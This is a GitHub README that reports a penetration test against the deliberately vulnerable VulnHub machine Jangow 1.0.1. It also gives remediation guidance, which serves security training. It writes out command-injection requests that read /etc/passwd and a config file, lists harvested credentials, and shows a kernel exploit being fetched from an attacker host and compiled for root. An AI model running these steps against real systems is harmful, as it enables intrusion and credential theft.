<div align="center">

```
     ██╗ █████╗ ███╗   ██╗ ██████╗  ██████╗ ██╗    ██╗
     ██║██╔══██╗████╗  ██║██╔════╝ ██╔═══██╗██║    ██║
     ██║███████║██╔██╗ ██║██║  ███╗██║   ██║██║ █╗ ██║
██   ██║██╔══██║██║╚██╗██║██║   ██║██║   ██║██║███╗██║
╚█████╔╝██║  ██║██║ ╚████║╚██████╔╝╚██████╔╝╚███╔███╔╝
 ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝  ╚══╝╚══╝
```

### Black-Box Penetration Test — Boot-to-Root Engagement Report
**Target:** Jangow 1.0.1 (VulnHub) · **Scope:** External Network → Web App → OS → Root

[![Platform](https://img.shields.io/badge/Platform-VulnHub-orange?style=for-the-badge)](https://www.vulnhub.com/entry/jangow-101,754/)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy%2FMedium-yellow?style=for-the-badge)]()
[![OS](https://img.shields.io/badge/Target%20OS-Ubuntu%2016.04-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)]()
[![Status](https://img.shields.io/badge/Root-Obtained-success?style=for-the-badge)]()
[![License](https://img.shields.io/badge/License-Educational%20Use-blue?style=for-the-badge)]()

</div>

---

## 📋 Executive Summary

This repository documents a full black-box penetration test conducted against **Jangow 1.0.1**, a deliberately vulnerable Linux host distributed via VulnHub for offensive security training. The engagement followed a structured methodology — external reconnaissance, web application enumeration, exploitation, credential harvesting, and local privilege escalation — culminating in full root compromise of the target.

The objective of this write-up is to demonstrate a repeatable, professional pentesting workflow rather than a "flag-hunting" CTF narrative: every step is mapped to a real-world attack technique, supported by evidence, and closed out with remediation guidance a client report would include.

| Engagement Detail | Value |
|---|---|
| **Target** | Jangow 1.0.1 (`.ova`, VulnHub) |
| **Attack Surface** | FTP (21), HTTP (80) |
| **Initial Foothold Vector** | Unauthenticated OS Command Injection (`busque.php`) |
| **Lateral Movement** | Credential reuse (config file → FTP/SSH) |
| **Privilege Escalation** | Linux Kernel 4.4.0 Local Exploit (CVE-2017-16995) |
| **Outcome** | `root` shell, `user.txt` + `root.txt` captured |

---

## 🗂️ Table of Contents

- [Lab Setup](#-lab-setup)
- [Attack Chain Overview](#-attack-chain-overview)
- [Phase 1 — Reconnaissance](#-phase-1--reconnaissance)
- [Phase 2 — Web Application Enumeration](#-phase-2--web-application-enumeration)
- [Phase 3 — Exploitation: OS Command Injection](#-phase-3--exploitation-os-command-injection)
- [Phase 4 — Credential Harvesting](#-phase-4--credential-harvesting)
- [Phase 5 — Initial Access](#-phase-5--initial-access)
- [Phase 6 — Privilege Escalation](#-phase-6--privilege-escalation)
- [Automation Scripts](#-automation-scripts)
- [Vulnerability Summary & Remediation](#-vulnerability-summary--remediation)
- [Tools Used](#-tools-used)
- [Repository Structure](#-repository-structure)
- [Skills Demonstrated](#-skills-demonstrated)
- [Legal & Ethical Disclaimer](#-legal--ethical-disclaimer)

---

## 🧪 Lab Setup

| Component | Detail |
|---|---|
| Hypervisor | VirtualBox |
| Network Mode | Host-Only / NAT (isolated lab segment) |
| Attacker Host | Kali Linux |
| Target | Jangow 1.0.1 (DHCP-assigned IP) |
| Target IP (example) | `192.168.56.X` |

> Replace example IPs/hostnames throughout this document with your own lab values before publishing screenshots.

---

## 🔗 Attack Chain Overview

```
┌──────────────────┐     ┌───────────────────┐     ┌────────────────────┐
│   Reconnaissance   │ ──▶ │  Web Enumeration   │ ──▶ │  Command Injection  │
│  Nmap (21, 80)     │     │  Dirb / manual     │     │  busque.php?buscar= │
└──────────────────┘     └───────────────────┘     └─────────┬──────────┘
                                                                │
                                                                ▼
┌──────────────────┐     ┌───────────────────┐     ┌────────────────────┐
│  Root Shell (PoC)  │ ◀── │ Kernel Privesc      │ ◀── │ Credential Harvest  │
│  CVE-2017-16995    │     │ uname -a → 4.4.0    │     │ wordpress/config.php│
└──────────────────┘     └───────────────────┘     └─────────┬──────────┘
                                                                │
                                                                ▼
                                                    ┌────────────────────┐
                                                    │  Initial Access      │
                                                    │  FTP/SSH jangow01    │
                                                    └────────────────────┘
```

---

## 🔍 Phase 1 — Reconnaissance

Standard external recon to fingerprint live services before touching the application layer.

```bash
nmap -sC -sV -p- -T4 -oN nmap_initial.txt <TARGET_IP>
```

**Findings:**

| Port | Service | Version |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 80/tcp | HTTP | Apache 2.4.18 (Ubuntu) |

Anonymous FTP login was attempted and **failed** — credentials would need to be sourced elsewhere in the kill chain.

---

## 🌐 Phase 2 — Web Application Enumeration

Directory brute-forcing with default wordlists (`dirb`, `gobusterf`) returned limited results, so enumeration shifted to manual browsing of the exposed `Index of /` listing.

```bash
gobuster dir -u http://<TARGET_IP>/site/ -w /usr/share/wordlists/dirb/common.txt
```

This surfaced a `site/` directory containing a `wordpress/` folder and a script named `busque.php` — a search feature accepting a `buscar` (Spanish for "search") GET parameter.

---

## 💉 Phase 3 — Exploitation: OS Command Injection

Probing the `buscar` parameter with shell metacharacters returned unfiltered command output — a textbook **unauthenticated OS Command Injection** (CWE-78 / OWASP A03: Injection).

```http
GET /site/busque.php?buscar=ls+-la HTTP/1.1
Host: <TARGET_IP>
```

Source confirmed via injected `cat`:

```php
<?php system($_GET['buscar']); ?>
```

User-controlled input passed directly into `system()` with zero sanitization — full arbitrary command execution as the web service user. A reverse shell was attempted but the target had no outbound internet access, so the engagement pivoted to a **blind enumeration strategy** entirely through injected commands.

A lightweight Python wrapper (see [Automation Scripts](#-automation-scripts)) was used to script repeated injections without manually re-encoding URLs in Burp Repeater each time.

---

## 🔑 Phase 4 — Credential Harvesting

Continued enumeration through the injection point revealed a WordPress configuration file:

```http
GET /site/busque.php?buscar=cat+wordpress/config.php HTTP/1.1
```

```php
$username = "desafio02";
$password = "abygurl69";
```

Cross-referencing `/etc/passwd` (also pulled via injection) revealed a local system account that didn't match the DB username directly:

```http
GET /site/busque.php?buscar=cat+/etc/passwd HTTP/1.1
```

```
jangow01:x:1000:1000:desafio02,,,:/home/jangow01:/bin/bash
```

The GECOS field (`desafio02`) tied the database credentials back to the **`jangow01`** system account — a classic case of **password/secret reuse across application and OS layers**, validating the password against the correct username.

**Harvested credentials:** `jangow01 : abygurl69`

---

## 🚪 Phase 5 — Initial Access

```bash
ftp <TARGET_IP>
# Name: jangow01
# Password: abygurl69
```

FTP access confirmed the credentials but offered limited interactivity. SSH was tested next using the same pair and succeeded, providing a full interactive shell:

```bash
ssh jangow01@<TARGET_IP>
cat /home/jangow01/user.txt
```

✅ **User flag captured.**

---

## ⬆️ Phase 6 — Privilege Escalation

Kernel fingerprinting identified an outdated, exploitable build:

```bash
uname -a
# Linux jangow01 4.4.0-* Ubuntu 16.04 x86_64
```

Kernel **4.4.0** is vulnerable to **CVE-2017-16995** (eBPF `BPF_ALU64` sign-extension bug), a well-documented local privilege escalation flaw with public PoC exploit code. Since the target had no outbound internet access, the exploit source was staged via FTP rather than `wget`/`curl`:

```bash
# On attacker host: serve exploit via FTP or simple HTTP server
# On target:
ftp <ATTACKER_IP>
get cve-2017-16995.c
exit

gcc cve-2017-16995.c -o cve-2017-16995
chmod +x cve-2017-16995
./cve-2017-16995
```

```bash
whoami
# root
cat /root/proof.txt
```

✅ **Root flag captured — full system compromise achieved.**

---

## 🤖 Automation Scripts

This repo includes scripts that operationalize the manual steps above into a repeatable toolchain:

| Script | Purpose |
|---|---|
| `recon.sh` | Automated Nmap sweep + service version capture |
| `cmdi_shell.py` | Pseudo-shell wrapper around the `busque.php` command injection for rapid blind enumeration |
| `cred_harvest.py` | Pulls and parses `config.php` / `/etc/passwd` via the injection point to auto-extract credential pairs |
| `privesc_stager.sh` | Stages the CVE-2017-16995 exploit to the target over FTP and compiles it remotely |

> See [`/scripts`](./scripts) for full source and usage instructions.

---

## 🛡️ Vulnerability Summary & Remediation

| # | Finding | Severity | CWE / Reference | Remediation |
|---|---|---|---|---|
| 1 | Unauthenticated OS Command Injection in `busque.php` | **Critical** | CWE-78 | Eliminate `system()`/`exec()` calls on user input; use parameterized APIs or allow-listed commands; apply strict input validation |
| 2 | Plaintext credentials stored in `wordpress/config.php` | **High** | CWE-256 | Externalize secrets to environment variables or a vault; restrict file permissions; never commit config files with live credentials |
| 3 | Credential reuse between application DB account and OS-level account | **High** | CWE-521 | Enforce unique credentials per trust boundary; enable account lockout / MFA on SSH and FTP |
| 4 | Outdated, unpatched Linux kernel (4.4.0) vulnerable to local privesc | **High** | CVE-2017-16995 | Patch management cadence for kernel updates; restrict local shell access; apply seccomp/AppArmor profiles to limit syscall surface |
| 5 | FTP service permitting credential-based auth without TLS | **Medium** | CWE-319 | Disable FTP in favor of SFTP/FTPS; enforce encrypted transport for all credentialed services |

---

## 🧰 Tools Used

`Nmap` · `Burp Suite Professional` · `Gobuster` / `Dirb` · `cURL` · `Python 3` · `FTP client` · `SSH` · `GCC` (on-target exploit compilation) · `Exploit-DB` / `Packet Storm` research

---

## 📁 Repository Structure

```
.
├── README.md
├── recon/
│   └── nmap_initial.txt
├── scripts/
│   ├── recon.sh
│   ├── cmdi_shell.py
│   ├── cred_harvest.py
│   └── privesc_stager.sh
├── exploits/
│   └── cve-2017-16995.c
├── evidence/
│   ├── 01_nmap_scan.png
│   ├── 02_command_injection_poc.png
│   ├── 03_config_php_leak.png
│   ├── 04_user_flag.png
│   └── 05_root_flag.png
└── report/
    └── Jangow_1.0.1_Pentest_Report.pdf
```

---

## 🧠 Skills Demonstrated

- External network reconnaissance & service fingerprinting
- Manual web application enumeration beyond default wordlists
- Identification and exploitation of unauthenticated OS command injection
- Blind/output-based exploitation under restricted outbound connectivity
- Credential harvesting and cross-boundary credential correlation (app → OS)
- Linux kernel vulnerability research and local exploit compilation
- Exploit development workflow under network-restrictive conditions (FTP staging vs. direct download)
- Translation of raw findings into a client-ready vulnerability report with CWE mapping and remediation guidance

---

## ⚖️ Legal & Ethical Disclaimer

This assessment was performed exclusively against **Jangow 1.0.1**, an intentionally vulnerable virtual machine distributed by VulnHub for security training purposes, in an isolated, offline lab environment. No real-world systems, third-party infrastructure, or production data were accessed at any point.

This repository is published strictly for educational and professional portfolio purposes. The techniques documented here must **never** be used against systems without explicit, written authorization. Unauthorized access to computer systems is illegal under laws such as the Computer Fraud and Abuse Act (US) and equivalent legislation in other jurisdictions.

---

<div align="center">

**Author:** Kitsana Thuekoh
*Cybersecurity Student · Boston Institute of Analytics — Penetration Testing & Security Operations*
CPTS · CompTIA PenTest+ · CompTIA Security+ · NASA VDP Letter of Recognition

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=flat-square&logo=linkedin&logoColor=white)]()
[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=flat-square&logo=github&logoColor=white)]()

</div>
